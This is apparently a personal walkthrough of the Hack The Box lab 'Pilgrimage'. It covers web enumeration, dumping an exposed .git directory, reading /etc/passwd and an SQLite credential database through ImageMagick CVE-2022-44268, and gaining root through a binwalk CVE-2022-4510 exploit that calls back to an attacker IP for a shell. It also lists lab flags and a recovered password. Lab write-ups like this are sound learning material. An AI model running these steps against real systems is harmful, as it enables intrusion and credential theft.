
Target : 10.129.28.117

Started off with the port scan : 22, 80

Adding domain in /etc/hosts file

`sudo nano /etc/hosts`  

**Enumerating Web**

Subdomain Enumeration using Fuff:

`ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.pilgrimage.htb" -u http://pilgrimage.htb/ -mc 200 -fl 199`

Got nothing

Directory bruteforcing using gobuster:

`gobuster dir -u "http://pilgrimage.htb/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt `

It revealed /.git/ folder

![](../Pasted%20image%2020260707102718.png)

using git-dumper, extracted the /.git folder

`python3 git-dumper.py http://pilgrimage.htb/.git/ git`

![](../Pasted%20image%2020260707102835.png)

And in the extracted folder found magick binary from ImageMagick which has many know vulnerabilities. for finding version 

`./magick -version `   (or)

```
./magick --appimage-extract
./squashfs-root/AppRun --version
```
  
![](../Pasted%20image%2020260707102202.png)

Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org

This version is vulnerable to command injection, # CVE-2022-44268

**Exploitation:** https://git.rotfl.io/v/CVE-2022-44268

`cargo run '/etc/passwd'`       (For generating a payload)

Then upload it to the website and download the shirnked one. 

`./../git/squashfs-root/AppRun identify -verbose 6a4c8c046471b.png`      (use this to get the hex value)

`python3 -c 'print(bytes.fromhex("hex"))'`

![](../Pasted%20image%2020260707105354.png)

While reading index.php, we noticed the sqlite line of storing data's in /var/db/pilgrimage/ lets read the data, using this method.

`$db = new PDO('sqlite:/var/db/pilgrimage');`

Let's exploit this

`cargo run '/var/db/pilgrimage'`

Upload it in the web and go the hex value

`python3 -c 'print(bytes.fromhex("hex-value"))'`

We got byte characters, we need to use the below code to convert it as a db file.

```
#dump.py

import sys;

data = b'<byte-payload'
open('pilgrimage.db', 'wb').write(data)
```

now, we can connect using sqlite3

`sqlite3 pilgrimage.db`

![](../Pasted%20image%2020260707112147.png)

`emily : abigchonkyboi123`

we can connect through ssh and got the user flag.

`user.txt : cef83de02430f775ed4e5b35a0b0b05c`

Root Escalation:

While checking process, noticed /usr/sbin/malwarescan.sh is executing as root

![](../Pasted%20image%2020260707115318.png)

checked the code, it is using binwalk v2.3.2 which is vulnerable to RCE (CVE-2022-4510)

Exploit url: https://www.exploit-db.com/exploits/51249

After reading about this vulnerability, it uses -e argument to execute the payload (binwalk)

`python3 exploit.py image.png <attacker_ip> <port>`

Got the image file, just need to upload it in the /var/www/pilgrimage.htb/shrunk to execute it successfully as root and got the shell

`root.txt : 7735372cb4d003e0076b35633e340144`

![](../Pasted%20image%2020260707115245.png)


To be noted:

1. Got stuck in arbitrary file read: /etc/passwd worked fine, then don't know what to do, even before getting into this phase, i analysed every code and i saw /var/db/pilgrimage in index.php, but haven't thought of retrieving it and writing as .db file
2. And in escalation, spotted the escalation vector, but don't know about binwalk escalation. and also instead of placing the file manually into the required folder, i uploaded in web instead. that's a mistake.